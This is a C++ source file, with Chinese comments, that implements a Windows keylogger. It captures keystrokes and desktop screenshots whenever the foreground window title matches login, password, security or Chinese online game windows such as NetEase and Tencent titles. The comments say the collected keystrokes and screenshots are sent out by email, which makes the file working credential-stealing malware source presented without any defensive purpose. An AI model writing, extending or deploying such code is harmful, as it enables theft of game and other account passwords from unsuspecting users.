// Key_Memory.cpp: implementation of the Key_Memory class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "Key_Memory.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

Key_Memory::Key_Memory()
{
    WindowCaption=NULL;
	Old_hwnd=NULL;
char * _LowerCase[95]={
"[BackSpace]",
"[Enter]",
"[ESC]",
"[F1]",
"[F2]",
"[F3]",
"[F4]",
"[F5]",
"[F6]",
"[F7]",
"[F8]",
"[F9]",
"[F10]",
"[F11]",
"[F12]",
"`",
"1",
"2",
"3",
"4",
"5",
"6",
"7",
"8",
"9",
"0",
"-",
"=",
"[TAB]",
"q",
"w",
"e",
"r",
"t",
"y",
"u",
"i",
"o",
"p",
"[",
"]",
"a",
"s",
"d",
"f",
"g",
"h",
"j",
"k",
"l",
";",
"'",
"z",
"x",
"c",
"v",
"b",
"n",
"m",
",",
".",
"/",
"\\",
"[CTRL]",
"[WIN]",
" ",
"[WIN]",
"[Print Screen]",
"[Scroll Lock]",
"[Insert]",
"[Home]",
"[PageUp]",
"[Del]",
"[End]",
"[PageDown]",
"[Left]",
"[UP]",
"[Right]",
"[Down]",
"[Num Lock]",
"/",
"*",
"-",
"+",
"0",
"1",
"2",
"3",
"4",
"5",
"6",
"7",
"8",
"9",
".",
};


char *_UpperCase[]={
"[BackSpace]",
"[Enter]",
"[ESC]",
"[F1]",
"[F2]",
"[F3]",
"[F4]",
"[F5]",
"[F6]",
"[F7]",
"[F8]",
"[F9]",
"[F10]",
"[F11]",
"[F12]",
"~",
"!",
"@",
"#",
"$",
"%",
"^",
"&",
"*",
"(",
")",
"_",
"+",
"[TAB]",
"Q",
"W",
"E",
"R",
"T",
"Y",
"U",
"I",
"O",
"P",
"{",
"}",
"A",
"S",
"D",
"F",
"G",
"H",
"J",
"K",
"L",
":",
"\"",
"Z",
"X",
"C",
"V",
"B",
"N",
"M",
"<",
">",
".?",
"|",
"[CTRL]",
"[WIN]",
" ",
"[WIN]",
"[Print Screen]",
"[Scroll Lock]",
"[Insert]",
"[Home]",
"[PageUp]",
"[Del]",
"[End]",
"[PageDown]",
"[Left]",
"[Up]",
"[Right]",
"[Down]",
"[Num Lock]",
"/",
"*",
"-",
"+",
"0",
"1",
"2",
"3",
"4",
"5",
"6",
"7",
"8",
"9",
".",
};


int _SpecialKeys[]={
8,
13,
27,
112,
113,
114,
115,
116,
117,
118,
119,
120,
121,
122,
123,
192,
49,
50,
51,
52,
53,
54,
55,
56,
57,
48,
189,
187,
9,
81,
87,
69,
82,
84,
89,
85,
73,
79,
80,
219,
221,
65,
83,
68,
70,
71,
72,
74,
75,
76,
186,
222,
90,
88,
67,
86,
66,
78,
77,
188,
190,
191,
220,
17,
91,
32,
92,
44,
145,
45,
36,
33,
46,
35,
34,
37,
38,
39,
40,
144,
111,
106,
109,
107,
96,
97,
98,
99,
100,
101,
102,
103,
104,
105,
110,
};
for (int i=0;i<95;i++)//拷贝记录标准键盘数组
{
	LowerCase[i]=_LowerCase[i];
	UpperCase[i]=_UpperCase[i];
	SpecialKeys[i]=_SpecialKeys[i];
}
PreviousFocus=NULL;
total_keyboard[0]='\0';
sum=0;
}

Key_Memory::~Key_Memory()
{
	//delete []total_keyboard;

}
/*BOOL Key_Memory::NeedToPicture()
{
	HWND hFocus = GetForegroundWindow();//获取当前的窗口句柄
	int WinLeng = GetWindowTextLength(hFocus);//获取窗口标题的长度
    char *WindowCaption=new char[WinLeng + 4];//开辟窗口标题长度大小的空间
    GetWindowText(hFocus,WindowCaption,(WinLeng + 1));//获取窗口标题
	string str(WindowCaption);//用窗口标题构造一个string类对象


	if(str=="地下城与勇士")//严格控制截图条件  可以自己增减需要记录的游戏窗口
	{
		delete WindowCaption;
		return true;
	}

	if(str=="梦幻西游ONLINE")//严格控制截图条件  可以自己增减需要记录的游戏窗口
	{
		delete WindowCaption;
		return true;
	}

	if (str.npos!=str.find("大话西游",0))//为了登陆之后马上就发送记录数据
	{
		delete WindowCaption;
		return true;
	}
	return false;

}*/
BOOL Key_Memory::IsThisWindow()
{
	HWND hFocus = GetForegroundWindow();//获取当前的窗口句柄
	int WinLeng = GetWindowTextLength(hFocus);//获取窗口标题的长度
    char *WindowCaption=new char[WinLeng + 4];//开辟窗口标题长度大小的空间
    GetWindowText(hFocus,WindowCaption,(WinLeng + 1));//获取窗口标题
	string str(WindowCaption);//用窗口标题构造一个string类对象

	if (str.npos!=str.find("网易",0))//下面为判断窗口标题中的关键字  
	{
		delete WindowCaption;//以此来判断是否是要记录的窗口
		return true;
	}
	if (str.npos!=str.find("密码",0))
	{
		delete WindowCaption;
		return true;
	}
	if (str.npos!=str.find("腾讯游戏",0))
	{
		delete WindowCaption;
		return true;
	}
	if (str.npos!=str.find("登录",0))
	{
		delete WindowCaption;
		return true;
	}
	if (str.npos!=str.find("安全",0))
	{
		delete WindowCaption;
		return true;
	}
	if (str.npos==str.find("[",0) && str.npos!=str.find("大话西游 II ($Revision: ",0))//为了登陆之后马上就发送记录数据
	{
		delete WindowCaption;
		return true;
	}
	if (str.npos==str.find("[",0) && str.npos!=str.find("梦幻西游ONLINE",0))//为了登陆之后马上就发送记录数据
	{
		delete WindowCaption;
		return true;
	}
	if (str == "梦幻西游ONLINE")//梦幻西游登陆窗口
	{
		delete WindowCaption;
		return true;
	}
	if (str == "CFQQLogin")//穿越火线游戏窗口
	{
		delete WindowCaption;
		return true;
	}
	if (str.npos!=str.find("AVA",0))//占地之王
	{
		delete WindowCaption;
		return true;
	}
	if (str == "QQ音速")//QQ音速
	{
		delete WindowCaption;
		return true;
	}
/*	if (str.npos!=str.find("地下城",0))//驱动保护  很无奈！！！！！！！！！！！！！！！！！
	{
		delete WindowCaption;
		return true;
	}*/
	delete WindowCaption;
	return false;
}

BOOL Key_Memory::IsWindowsFocusChange()//判断窗口是否改变了  如果非有效窗口限制窗口记录
{
	HWND hFocus = GetForegroundWindow();
	if (hFocus != PreviousFocus)//如果改变了
	{
		Old_hwnd=PreviousFocus;
		PreviousFocus = hFocus;
        WindowCaption = NULL;
		if (strlen(KeyBuffer)>0 && strlen(KeyBuffer)<100)//并且前面窗口有键盘按下过  
		{
			strcat(total_keyboard,"上面窗口输入过：");//记录键盘按下的建
			strcat(KeyBuffer,"\r\n");
	        strcat(total_keyboard,KeyBuffer);
			memset(KeyBuffer,0,sizeof(KeyBuffer));
			sum++;

			//Sleep(1000);
			picture.OnPackMap(1000,0,800,1400);//截图桌面窗口并保存	
			
			FILE * fp = fopen("temp.bmp", "rb");
			unsigned long fsize, foutsize;
			char* fdata;
			char* fout;
			if (fp == NULL) 
			{
				return -1;
			}

			{
				fseek(fp, 0, SEEK_END);
				fsize = ftell(fp);
				fseek(fp, 0, SEEK_SET);
				fdata = (char*)malloc(fsize);
				fout  = (char*)malloc(fsize + 32);
				fread(fdata, fsize, 1, fp);
				fclose(fp);
			}

			if (my_compress.zlib_compress2(fout, &foutsize, fdata, fsize, 9) == 0) 
			{
			    fp = fopen("temp.yao", "wb");
				if (fp)
				{
					fwrite(fout, foutsize, 1, fp);
				}
				else 
				{
					return -2;
				}
				fclose(fp);
			}
			free(fdata);
            free(fout);


            //Sleep(5000);

			HWND hFocus_now = GetForegroundWindow();//为了获取某些游戏的服务器信息
			int WinLeng = GetWindowTextLength(hFocus_now);
            char caption[100] = {0};
			GetWindowText(hFocus_now,caption,WinLeng + 1);
			strcat(caption,"\r\n");
			strcat(total_keyboard,caption);
		}

		else if(!IsThisWindow())//如果不是要记录的窗口
		{
			while (true)//直到为要记录的窗口  获取标题  跳出循环
			{
				if(IsThisWindow())
				{
					int WinLeng = GetWindowTextLength(hFocus);
					char caption[100] = {0};
					GetWindowText(hFocus,caption,WinLeng + 1);

					strcat(caption,"\r\n");
					strcat(total_keyboard,caption);
					break;
				}
				Sleep(1000);
			}
			//printf("%s\n",total_keyboard);
		}
		else//如果是要记录的窗口  增加窗口标题到记录
		{
			int WinLeng = GetWindowTextLength(hFocus);
			char caption[100] = {0};
			GetWindowText(hFocus,caption,(WinLeng + 1));

			strcat(caption,"\r\n");
			strcat(total_keyboard,caption);
		}
	}
	WindowCaption = NULL;
	return true;
}

//此函数根据有效窗口的变化次数   窗口是否需要截图   窗口是否有键盘按下   以及当前窗口是否为有效窗口 来返回布尔型变量

//应用程序对象类的 InitInstance  会根据此函数返回值来判断是否发送邮件

//此函数在窗口变化时会设置发送图片的标记   stmp类会根据本类的 is_send_picture 来判断邮件中是否发送图片

BOOL Key_Memory::KeyLogger(string & buffer)
{
	if(!IsThisWindow())// 重要！！！  如果不是需要记录的窗口就不会进入记录函数体  立即返回FALSE
	    return false;

	int bKstate[256] = {0};   
    int i,x;
    int state;   
    int shift;
	memset(KeyBuffer,0,sizeof(KeyBuffer));
	buffer = "";
	while (true)
	{
		IsWindowsFocusChange();//如果记录过程中窗口改变了  函数自动完成将上一个窗口的键盘按下记录到总数据 
		//如果不是有效窗口 那么直到变化到有效窗口 才添加当前窗口标题然后返回  如果是直接添加窗口标题


		if (sum >= 1)//如果有效窗口的变化次数满足   
		{
			//printf("%s\n",total_keyboard);
			buffer.append(total_keyboard);//把记录数据传递出去
			memset(total_keyboard,0,sizeof(total_keyboard));//清空
			memset(KeyBuffer,0,sizeof(KeyBuffer));
			sum=0;//窗口计数器清零
			return true;
		}

		Sleep(50);

        	

//下面为实际记录代码

		for (i=0;i<95;i++)
		{
			shift = GetKeyState(VK_SHIFT);
			x = SpecialKeys[i];

			if (GetAsyncKeyState(x) & 0x8000)
			{
				if (((GetKeyState(VK_CAPITAL) != 0) && (shift > -1) && (x > 64) && (x < 91)))
				{
					bKstate[x] = 1;     //Uppercase Characters A-Z
				}

				else if (((GetKeyState(VK_CAPITAL) != 0) && (shift < 0) && (x > 64) && (x < 91)))
				{
					bKstate[x] = 2;     //Lowercase a-z
				}

				else if (shift < 0)
				{
					bKstate[x] = 3;     //Uppercase Characters A-Z
				}
				
				else
					bKstate[x] = 4;
			}
			else
			{
				if (bKstate[x] != 0)
				{
					state = bKstate[x];
					bKstate[x] = 0;
					if (x == 8)
					{
						if(strlen(KeyBuffer) > 100)//如果太多清空，因为一定是游戏中按下了这么多的键盘
						{
							memset(KeyBuffer,0,sizeof(KeyBuffer));
							continue;
						}
						else
						{
							KeyBuffer[strlen(KeyBuffer) - 1] = 0;
							strcat(KeyBuffer,UpperCase[i]);
							continue;
						}
					}
					else if ((state%2) == 1)
					{
						if(strlen(KeyBuffer) > 100)//如果太多清空
						{
							memset(KeyBuffer,0,sizeof(KeyBuffer));
						}
						else
						{
						    strcat(KeyBuffer,UpperCase[i]);
						}
					}
					else if ((state%2) == 0)
					{
						if(strlen(KeyBuffer) > 100)//如果太多清空
						{
							memset(KeyBuffer,0,sizeof(KeyBuffer));
						}
						else
						{
						    strcat(KeyBuffer,LowerCase[i]);
						}
					}
				}
			}
		}//end of for
	}//end of while
}//end of funtionLowerCase


